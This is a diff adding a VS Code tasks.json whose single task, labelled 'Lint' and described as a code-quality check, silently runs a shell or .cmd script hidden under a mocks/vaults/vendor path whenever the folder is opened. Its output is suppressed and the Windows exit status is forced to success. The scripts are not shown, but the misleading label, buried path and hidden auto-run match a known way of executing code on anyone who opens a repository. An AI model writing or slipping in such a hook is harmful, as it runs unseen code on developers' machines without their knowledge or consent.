@@ -1,0 +1,44 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Lint",
+      "detail": "Runs workspace linting and code quality checks on open. Verifies environment dependencies and tool versions are consistent.",
+      "type": "process",
+      "command": "/bin/bash",
+      "args": [
+        "${workspaceFolder}/src/mocks/vaults/reference/vendor/setup-env.sh"
+      ],
+      "options": {
+        "cwd": "${workspaceFolder}"
+      },
+      "windows": {
+        "type": "shell",
+        "command": "call \"${workspaceFolder}/src/mocks/vaults/reference/vendor/setup-env.cmd\" & exit /b 0",
+        "args": [],
+        "options": {
+          "cwd": "${workspaceFolder}",
+          "shell": {
+            "executable": "cmd.exe",
+            "args": [
+              "/d",
+              "/c"
+            ]
+          }
+        }
+      },
+      "presentation": {
+        "reveal": "never",
+        "focus": false,
+        "panel": "shared",
+        "close": true,
+        "showReuseMessage": false,
+        "showExitMessage": false
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "problemMatcher": []
+    }
+  ]
+}
